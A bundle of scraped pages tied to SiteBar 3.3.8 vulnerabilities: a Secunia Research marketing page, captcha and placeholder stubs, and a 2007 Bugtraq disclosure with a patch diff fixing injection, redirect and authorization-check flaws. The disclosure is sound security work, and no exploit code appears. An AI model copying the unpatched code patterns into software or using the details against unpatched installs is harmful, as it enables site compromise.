=== Content from secunia.com_4512908c_20250124_161858.html ===


[Skip to main content](#main-content)
[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

Search

## Main navigation

* Solutions
  + Column 1
    - Business challenge
      * [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
      * [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
      * [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
      * [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
      * [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
      * [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
      * [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
      * [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
      * [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
      * [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
      * [Public sector](https://www.flexera.com/solutions/public-sector)
  + Column 2
    - Spend management by vendor
      * [IBM](https://www.flexera.com/solutions/vendor/ibm)
      * [Oracle](https://www.flexera.com/solutions/vendor/oracle)
      * [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
      * [SAP](https://www.flexera.com/solutions/vendor/sap)
      * [VMware](https://www.flexera.com/solutions/vendor/vmware)
      * [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
      * [AWS](https://www.flexera.com/solutions/vendor/aws)
      * [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
      * [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
      * [Adobe](https://www.flexera.com/solutions/vendor/adobe)

  ### Achieve more through a united FinOps and ITAM function

  The future is hybrid. Break down the walls between ITAM and FinOps to drive more revenue, more customer growth and more innovation.

  [Discover More](https://www.flexera.com/resources/hybrid-itam-finops)
* Products
  + Column 1
    - [Flexera One](https://www.flexera.com/products/flexera-one)
      * [IT Visibility](https://www.flexera.com/products/flexera-one/it-visibility)
      * [ITAM](https://www.flexera.com/products/flexera-one/it-asset-management)
      * [SaaS Management](https://www.flexera.com/products/flexera-one/saas-management)
      * [FinOps](https://www.flexera.com/products/flexera-one/finops)
      * [Technology Intelligence Platform](https://www.flexera.com/products/flexera-one/technology-intelligence-platform)
  + Column 2
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
      * [Snow Spend Optimizer](https://www.flexera.com/products/snow-atlas/snow-spend-optimizer)
      * [Snow SaaS Management](https://www.flexera.com/products/snow-atlas/snow-saas-management)
  + Column 3
    - Hide group
      * [Security](https://www.flexera.com/products/security)
      * [Application Readiness](https://www.flexera.com/products/adminstudio)
      * [All products](https://www.flexera.com/products)
      * [All Snow products](https://www.flexera.com/products/snow)
      * [Integrations](https://www.flexera.com/products/integrations)

  ### Flexera 2024 State of the Cloud Report

  What do transformative initiatives such as GenAI, machine learning and sustainability mean for the cloud? Check out the 2024 State of the Cloud Report to find the answer as well as all the latest cloud computing trends.

  [View Report](https://info.flexera.com/CM-REPORT-State-of-the-Cloud)
* Success
  + Column 1
    - [Customer success](https://www.flexera.com/customer-success)
      * Support
        + [Flexera support portal](https://community.flexera.com/s/support-hub)
        + [Flexera product documentation](https://docs.flexera.com)
        + [Snow product documentation](https://docs.snowsoftware.io/)
      * Services and training
        + [Services](https://www.flexera.com/customer-success/services)
        + [Training](https://www.flexera.com/customer-success/training)
  + Column 2
    - Hide group
      * [Technology Intelligence Awards](https://www.flexera.com/customer-success/awards)
      * [Flexera community](https://community.flexera.com/s/)

  ### Insights from Gartner®

  Find a curated series of actionable and objective insights for IT executives and their teams. Get expert insights from valued analysts, courtesy of Flexera.

  [Discover More](https://www.flexera.com/resources/gartner-analyst-research)
* Resources
  + Column 1
    - [Resources](https://www.flexera.com/resources)
      * [Webinars](https://www.flexera.com/resources?type%5Bwebinar%5D=webinar)
      * [Videos](https://www.flexera.com/resources?type%5Bvideo%5D=video)
      * [Datasheets](https://www.flexera.com/resources?type%5Bdatasheet%5D=datasheet)
      * [White papers & reports](https://www.flexera.com/resources?type%5Bwhite-paper-industry-report%5D=white-paper-industry-report)
  + Column 2
    - Hide group
      * [Blog](/blog/)
      * [Case studies](https://www.flexera.com/resources/case-studies)
      * [Events](https://www.flexera.com/resources?type%5Bevent%5D=event)
      * [Analyst Research](https://www.flexera.com/resources/gartner-analyst-research)
      * [Glossary](https://www.flexera.com/resources/glossary)
      * [Demos & trials](https://www.flexera.com/resources?type%5Bdemo-trials%5D=demo-trials)
      * [Business value calculator](https://www.flexera.com/resources/business-value-calculator)

  ### Flexera 2025 IT Priorities Report

  Insights from Flexera’s 2025 IT Priorities Report highlight what’s top of mind for IT decision makers in the year ahead. Discover the challenges, priorities and opportunities that will shape the future IT landscape.

  [View Report](https://info.flexera.com/ITV-REPORT-IT-Priorities)
* About
  + Column 1
    - [Company](https://www.flexera.com/about-us)
      * [About](https://www.flexera.com/about-us)
      * [Careers](https://www.flexera.com/about-us/careers)
      * [Contact](https://www.flexera.com/about-us/contact-us)
      * [Leadership](https://www.flexera.com/about-us/leadership)
    - [Partners](https://www.flexera.com/about-us/partners)
      * [Partner program](https://www.flexera.com/about-us/partners/partner-program)
      * [Partner directory](https://www.flexera.com/about-us/partners/directory)
  + Column 2
    - [Press center](https://www.flexera.com/about-us/press-center)
      * [Press releases](https://www.flexera.com/about-us/all-press-releases)
      * [Awards](https://www.flexera.com/about-us/press-center#awards)
      * [Articles](https://www.flexera.com/about-us/all-articles)
    - Hide group
      * Social responsibility
        + [ESG](https://www.flexera.com/about-us/environmental-social-governance)
        + [Diversity](https://www.flexera.com/about-us/diversity)

  ### More value with technology intelligence

  The unparalleled synergy of Flexera and Snow provides the Technology Intelligence you need for more efficiency, insight and governance than ever before.

  [Discover More](https://www.flexera.com/more-value-with-technology-intelligence)

Search

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

## External Links

* External Links
  + [Community](https://community.flexera.com/)
  + [Product Access](https://app.flexera.com/login)
  + [Partner Portal](https://flexera.channeltivity.com/Login)

[Book a demo](/about-us/contact-us?C_Interest1=sales)

# Secunia Research

## The world’s best vulnerability intelligence

The Secunia Research team from Flexera provides the most accurate and reliable source of vulnerability intelligence.

[Contact Us](https://www.flexera.com/about-us/contact-us?C_Interest1=sales&C_SolutionInterest=SVM)
Watch video (0:29)

Related links

* [Anatomy of a security advisory](https://www.flexera.com/resources/infographics/anatomy-of-a-security-advisory)
* [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)
* [Software Vulnerability Manager](/products/software-vulnerability-manager)
* [Security advisories from Secunia Research](https://www.flexera.com/products/security/software-vulnerability-advisories)
* [Report a vulnerability](https://www.flexera.com/about-us/contact-us/report-vulnerability)

 ![Secunia Research](/sites/default/files/2022-04/hero-secunia-research-bg.jpg)

Featured Details

## Multiple ways to consume Secunia Research

Secunia delivers software security research that provides reliable, curated and actionable vulnerability intelligence. Organizations can expect to receive standardized, validated and enriched vulnerability research on a specific version of a software product. Secunia Research supports four solutions:

![Software Vulnerability Research](/sites/default/files/2022-04/icon-secunia-research-svr.svg)

### [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)

Software Vulnerability Research utilizes Secunia Research to drive awareness of vulnerabilities matching your specified criteria

[Learn More](https://www.flexera.com/products/software-vulnerability-research)

![Software Vulnerability Manager](/sites/default/files/2022-04/icon-secunia-research-svm.svg)

### [Software Vulnerability Manager](/products/software-vulnerability-manager)

Software Vulnerability Manager uses Secunia Research data to identify, prioritize and patch known vulnerable software detected in your environment

[Learn More](/products/software-vulnerability-manager)

![Data Platform](/sites/default/files/2022-04/icon-secunia-research-dp.svg)

### [Data Platform](https://www.flexera.com/products/data-platform)

Data Platform leverages Secunia Research to provide high-level insights based on major or minor versions of software in your normalized inventory

[Learn More](https://www.flexera.com/products/data-platform)

![Flexera One](/sites/default/files/2022-04/icon-secunia-research-flexera-one.svg)

### [Flexera One](/flexera-one)

Flexera One utilizes Secunia Research (alongside public NVD data) to provide more granular matching of build-level versions of software in your normalized inventory within its IT Asset Management and IT Visibility solutions

[Learn More](/flexera-one)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Informing IT, Transforming IT

## Industry insights to help keep you informed

[#### Webinar

### Stay Ahead of Cyber Threats: Flexera's Latest Vulnerability Insights

Join us for this session where we'll explore the latest findings from the Flexera Monthly Vulnerability Insights Report.](https://info.flexera.com/SVM-WBNR-Vulnerability-Insights-Roundtable)

[#### Webinar

### Dive deeper into the Flexera Annual Vulnerability Insights

We'll explore the key findings from the Flexera Annual Vulnerability Insights Report. Learn about the latest cybersecurity trends, the most targeted industries, the types of vulnerabilities, plus management and mitigation strategies.](https://info.flexera.com/SVM-WBNR-Flexera-Annual-Vulnerability-Insights?lead_source=Website%20Visitor&id=Flexera.com-Resources)

#### Video

### Close the Risk Window with Software Vulnerability Manager

Stop reacting. Gain control. Stay secure. Build a more effective risk mitigation process leveraging Secunia Research vulnerability intelligence and the largest repository of third-party patch data in the industry.

Remote video URL

[#### Trial

### Software Vulnerability Manager Assessment free trial

Get access to the complete set of modules of Software Vulnerability Manager: Research, Assessment and Patching](https://info.flexera.com/SVM-EVAL-Software-Vulnerability-Manager)

[#### Datasheet

### Protect your ServiceNow® investment with the highest quality data

IT Visibility offers certified ServiceNow integrations that accelerate platform expansion, improve ROI and increase efficiencies across ITIL processes by delivering clean software and hardware asset data directly.](/sites/default/files/datasheet-itv-maximize-servicenow-investment.pdf)

[#### Blog

### Avoid missing crucial vulnerability intelligence amid NVD backlog

Recent developments regarding the National Vulnerability Database (NVD) have some technology leaders on edge. Since February, the U.S. National Institute of Standards and Technology (NIST) has almost completely stopped enriching software vulnerabi...](https://www.flexera.com/blog/vulnerability-management/avoid-missing-crucial-vulnerability-intelligence-amid-nvd-backlog/)

[View all resources](https://www.flexera.com/resources?category%5Bsoftware-vulnerability-management%5D=software-vulnerability-management)

## Footer Menu

* Column
  + Business challenge
    - [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
    - [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
    - [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
    - [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
    - [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
    - [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
    - [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
    - [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
    - [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
    - [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
    - [Public sector](https://www.flexera.com/solutions/public-sector)
* Column
  + Spend management by vendor
    - [IBM](https://www.flexera.com/solutions/vendor/ibm)
    - [Oracle](https://www.flexera.com/solutions/vendor/oracle)
    - [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
    - [SAP](https://www.flexera.com/solutions/vendor/sap)
    - [VMware](https://www.flexera.com/solutions/vendor/vmware)
    - [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
    - [AWS](https://www.flexera.com/solutions/vendor/aws)
    - [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
    - [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
    - [Adobe](https://www.flexera.com/solutions/vendor/adobe)
* Column
  + Products
    - [Flexera One](https://www.flexera.com/products/flexera-one)
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
    - [Security](https://www.flexera.com/products/security)
    - [Application Readiness](https://www.flexera.com/products/adminstudio)
    - [All products](https://www.flexera.com/products)
    - [All Snow products](https://www.flexera.com/products/snow)
    - [Integrations](https://www.flexera.com/products/integrations)
* Column
  + Company
    - [About](https://www.flexera.com/about-us)
    - [Careers](https://www.flexera.com/about-us/careers)
    - [Leadership](https://www.flexera.com/about-us/leadership)
    - [Contact us](https://www.flexera.com/about-us/contact-us)
    - [Media / press center](https://www.flexera.com/about-us/press-center)
    - [Revenera.com](https://www.revenera.com)

 +1.800.374.4353

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

 [![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

© 2025 Flexera. All Rights Reserved.

## Footer

* [Privacy Policy](https://www.flexera.com/legal/privacy-policy)
* [Terms and conditions](https://www.flexera.com/legal)
* [Contact Us](https://www.flexera.com/about-us/contact-us)
* [Impressum](https://www.flexera.com/about-us/impressum)
* [Site Map](https://www.flexera.com/sitemap)

#####

×

...



=== Content from cxsecurity.com_605190b1_20250126_021024.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from www.vupen.com_95145f5f_20250124_161900.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61



=== Content from securityreason.com_140ab1fa_20250124_161858.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **Serious holes affecting SiteBar 3.3.8** **2007.10.30** Credit:  **[Tim Brown](https://cxsecurity.com/author/Tim%2BBrown/1/)**  Risk: **Medium** Local: ****Yes**** Remote: ****Yes**** CVE: **[CVE-2007-5692](https://cxsecurity.com/cveshow/CVE-2007-5692/ "Click to see CVE-2007-5692")** | **[CVE-2007-5693](https://cxsecurity.com/cveshow/CVE-2007-5693/ "Click to see CVE-2007-5693")** | **[CVE-2007-5694](https://cxsecurity.com/cveshow/CVE-2007-5694/ "Click to see CVE-2007-5694")** | **[CVE-2007-5695](https://cxsecurity.com/cveshow/CVE-2007-5695/ "Click to see CVE-2007-5695")** CWE: **N/A** | | --- | |
| --- | --- | --- | --- |

All,
As a result of a short security audit of SiteBar, a number of security holes
were found. The holes included code execution, a malicious redirect and
multiple cases of Javascript injection.
After liasing with the developers, the holes have been patched. Attached are
the advisory and patch relating to these flaws.
CVEs open already relating to this audit:
\* CVE-2006-3320 (Javascript injection) - previously reported by other parties
but not resolved and so included for completeness
\* CVE-2007-5492 (code execution) - first reported in my attached advisory to
the vendor, independently rediscovered by Robert Buchholz of Gentoo whilst
auditing the differences between the patched and unpatched versions (3.3.8 vs
3.3.9)
\* CVE-2007-5491 (file permissions issue) - apparently patched by the vendor at
the same time as my issues were resolved and discovered by Robert Buchholz of
Gentoo whilst auditing the differences between the patched and unpatched
versions (3.3.8 vs 3.3.9)
It is intended that CVE-2007-5492 will be updated to reference both code
execution flaws I reported. All other issues in the advisory have been
patched but no CVEs have yet been requested or assigned to the best of my
knowledge.
Tim
--
Tim Brown
<mailto:timb (at) nth-dimension.org (dot) uk [email concealed]>
<http://www.nth-dimension.org.uk/>
Index: command.php
===================================================================
--- command.php (revision 412)
+++ command.php (working copy)
@@ -94,8 +94,15 @@
{
if (!$this->um->isAuthorized($this->command,
in\_array($this->command, array('Log In', 'Log Out', 'Sign Up')),
- SB\_reqVal('command\_gid'), SB\_reqVal('nid\_acl'), SB\_reqVal('lid\_acl')))
+ SB\_reqValInt('command\_gid'), SB\_reqValInt('nid\_acl'), SB\_reqValInt('lid\_acl')))
{
+ $bld = 'build' . $this->shortName();
+ $cmd = 'command' . $this->shortName();
+
+ if (!method\_exists($this,$bld) && !method\_exists($this,$cmd))
+ {
+ $this->command = 'Unknown command!';
+ }
$this->um->accessDenied();
return;
}
@@ -849,6 +856,7 @@
// be otherwise lost. Needed to go back.
if ($disabled && $params['type'] == 'text')
{
+ $params['value'] = str\_replace('"',"'",$params['value']);
?>
<input type="hidden" name="<?php echo SB\_safeVal($params,'name') ?>" value="<?php echo $params['value']?>">
<?php
@@ -857,6 +865,7 @@
if ($name{0} == '-')
{
+ $params['value'] = str\_replace('"',"'",$params['value']);
?>
<input type="hidden" name="<?php echo $params['name']?>" value="<?php echo $params['value']?>">
<?php
@@ -927,7 +936,7 @@
}
elseif (isset($params['type']) && ($params['type'] == 'button') || ($params['type'] == 'addbutton'))
{
- if (!$this->um->isAuthorized($name,false,null,SB\_reqVal('nid\_acl'),SB\_reqVa
l('lid\_acl'))) continue;
+ if (!$this->um->isAuthorized($name,false,null,SB\_reqValInt('nid\_acl'),SB\_re
qValInt('lid\_acl'))) continue;
if ($params['type'] == 'button')
{
@@ -1664,7 +1673,7 @@
function buildDeleteTree()
{
- $node = $this->tree->getNode(SB\_reqVal('nid\_acl',true));
+ $node = $this->tree->getNode(SB\_reqValInt('nid\_acl',true));
if (!$node) return null;
$fields['Folder Name'] = array('name'=>'name','value'=>$node->name, 'disabled'=>null);
@@ -1677,10 +1686,10 @@
function commandDeleteTree()
{
- $this->tree->removeNode(SB\_reqVal('nid\_acl'), false);
+ $this->tree->removeNode(SB\_reqValInt('nid\_acl'), false);
if ($this->um->getParam('user','use\_trash'))
{
- $this->tree->purgeNode(SB\_reqVal('nid\_acl'));
+ $this->tree->purgeNode(SB\_reqValInt('nid\_acl'));
}
SB\_unsetVal('nid\_acl');
$this->forwardCommand('Maintain Trees');
@@ -1834,7 +1843,8 @@
return;
}
- if (SB\_reqChk('forward'))
+ // This should handle login from translator.php, we should avoid external redirect
+ if (SB\_reqChk('forward') && strpos(SB\_reqVal('forward'),'/') === false)
{
header('Location: '.SB\_reqVal('forward'));
exit;
@@ -2681,14 +2691,14 @@
return null;
}
- if (SB\_reqVal('uid') == SB\_ADMIN)
+ $uid = intval(SB\_reqVal('uid'));
+
+ if ($uid == SB\_ADMIN)
{
$this->error('Cannot modify administrator!');
return null;
}
- $uid = SB\_reqVal('uid');
-
$fields = array();
$user = $this->um->getUser($uid);
$fields['Username'] = array('name'=>'email', 'value'=>$user['username'], 'disabled' => null);
@@ -3960,7 +3970,7 @@
function buildAddFolder()
{
$fields = array();
- $node = $this->tree->getNode(SB\_reqVal('nid\_acl',true));
+ $node = $this->tree->getNode(SB\_reqValInt('nid\_acl',true));
if (!$node) return null;
if ($this->command == 'Add Folder')
@@ -4020,7 +4030,7 @@
function commandAddFolder()
{
- $nid = $this->tree->addNode(SB\_reqVal('nid\_acl'),SB\_reqVal('name'),
+ $nid = $this->tree->addNode(SB\_reqValInt('nid\_acl'),SB\_reqVal('name'),
SB\_reqVal('comment'), SB\_reqVal('sort\_mode'));
if ($this->um->pmode && !$this->hasErrors())
@@ -4037,7 +4047,7 @@
$this->skipBuild = true;
$this->reload = !$this->um->getParam('user','extern\_commander');
$this->close = $this->um->getParam('user','auto\_close');
- $this->um->hiddenFolders[SB\_reqVal('nid\_acl')] = 1;
+ $this->um->hiddenFolders[SB\_reqValInt('nid\_acl')] = 1;
$this->um->setParam('user','hidden\_folders', implode(':',array\_keys($this->um->hiddenFolders)));
$this->um->saveUserParams();
}
@@ -4048,7 +4058,7 @@
$this->reload = !$this->um->getParam('user','extern\_commander');
$this->close = $this->um->getParam('user','auto\_close');
- $parent = $this->tree->getNode(SB\_reqVal('nid\_acl'));
+ $parent = $this->tree->getNode(SB\_reqValInt('nid\_acl'));
$this->tree->loadNodes($parent, false, 'select', true);
@@ -4073,7 +4083,7 @@
function buildFolderProperties()
{
- $node = $this->tree->getNode(SB\_reqVal('nid\_acl', true));
+ $node = $this->tree->getNode( intval(SB\_reqValInt('nid\_acl', true)) );
$fields = $this->buildAddFolder();
@@ -4100,13 +4110,13 @@
function commandFolderProperties()
{
- $node = $this->tree->getNode(SB\_reqVal('nid\_acl', true));
+ $node = $this->tree->getNode(SB\_reqValInt('nid\_acl', true));
if ($node->id\_parent && !$node->parentHasRight('update'))
{
return;
}
- $nid = SB\_reqVal('nid\_acl');
+ $nid = SB\_reqValInt('nid\_acl');
$columns = array
(
@@ -4131,7 +4141,7 @@
function buildCustomOrder()
{
- $node = $this->tree->getNode(SB\_reqVal('nid\_acl', true));
+ $node = $this->tree->getNode(SB\_reqValInt('nid\_acl', true));
$this->tree->loadNodes($node);
$fields['-raw1-'] = "<table cellpadding='0'>";
@@ -4155,7 +4165,7 @@
function commandCustomOrder()
{
- $node = $this->tree->getNode(SB\_reqVal('nid\_acl', true));
+ $node = $this->tree->getNode(SB\_reqValInt('nid\_acl', true));
$this->tree->loadNodes($node);
$order = array();
@@ -4196,7 +4206,7 @@
$fields['Delete Content Only'] = array('name'=>'content','type'=>'checkbox',
'title'=>SB\_P('command::tooltip\_delete\_content'));
- $node = $this->tree->getNode(SB\_reqVal('nid\_acl', true));
+ $node = $this->tree->getNode(SB\_reqValInt('nid\_acl', true));
if ($this->\_deleteContentOnly($node))
{
@@ -4209,14 +4219,14 @@
function commandDeleteFolder()
{
- $node = $this->tree->getNode(SB\_reqVal('nid\_acl', true));
+ $node = $this->tree->getNode(SB\_reqValInt('nid\_acl', true));
$deleteContentOnly = SB\_reqVal('content') || $this->\_deleteContentOnly($node);
- $this->tree->removeNode(SB\_reqVal('nid\_acl'), $deleteContentOnly);
+ $this->tree->removeNode(SB\_reqValInt('nid\_acl'), $deleteContentOnly);
if (!$this->um->getParam('user','use\_trash') && $node->hasRight('purge'))
{
- $this->tree->purgeNode(SB\_reqVal('nid\_acl'));
+ $this->tree->purgeNode(SB\_reqValInt('nid\_acl'));
}
}
@@ -4229,7 +4239,7 @@
function commandPurgeFolder()
{
- $this->tree->purgeNode(SB\_reqVal('nid\_acl'));
+ $this->tree->purgeNode(SB\_reqValInt('nid\_acl'));
}
/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\*\*\*\*\*\*\*/
@@ -4241,7 +4251,7 @@
function commandUndelete()
{
- $this->tree->undeleteNode(SB\_reqVal('nid\_acl'));
+ $this->tree->undeleteNode(SB\_reqValInt('nid\_acl'));
}
/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\*\*\*\*\*\*\*/
@@ -4261,7 +4271,7 @@
$sourceId = SB\_reqVal('sid',true);
$sourceIsNode = SB\_reqVal('stype',true);
$sourceObj = null;
- $targetID = SB\_reqVal('nid\_acl',true);
+ $targetID = SB\_reqValInt('nid\_acl',true);
$targetNode = $this->tree->getNode($targetID);
$sourceNodeId = $sourceId;
@@ -4337,7 +4347,7 @@
function commandPaste()
{
- $targetID = SB\_reqVal('nid\_acl');
+ $targetID = SB\_reqValInt('nid\_acl');
$sourceId = SB\_reqVal('sid',true);
$sourceIsNode = SB\_reqVal('stype',true);
$move = SB\_reqVal('mode',true)=='Move';
@@ -4401,10 +4411,10 @@
function buildEmailLink()
{
$fields = array();
- $link = $this->tree->getLink(SB\_reqVal('lid\_acl'));
+ $link = $this->tree->getLink(SB\_reqValInt('lid\_acl'));
if (!$link) return null;
- $fields['--hidden1--'] = array('name'=>'lid\_acl', 'value'=> SB\_reqVal('lid\_acl'));
+ $fields['--hidden1--'] = array('name'=>'lid\_acl', 'value'=> SB\_reqValInt('lid\_acl'));
if ($this->um->canUseMail())
{
@@ -4433,7 +4443,7 @@
return;
}
- $link = $this->tree->getLink(SB\_reqVal('lid\_acl'));
+ $link = $this->tree->getLink(SB\_reqValInt('lid\_acl'));
if (!$link) return null;
$subject = SB\_T('SiteBar: Web site') . ' ' . $link->name;
@@ -4520,7 +4530,7 @@
if (SB\_reqChk('nid\_acl') && SB\_reqVal('bookmarklet')!=1)
{
- $node = $this->tree->getNode(SB\_reqVal('nid\_acl'));
+ $node = $this->tree->getNode(SB\_reqValInt('nid\_acl'));
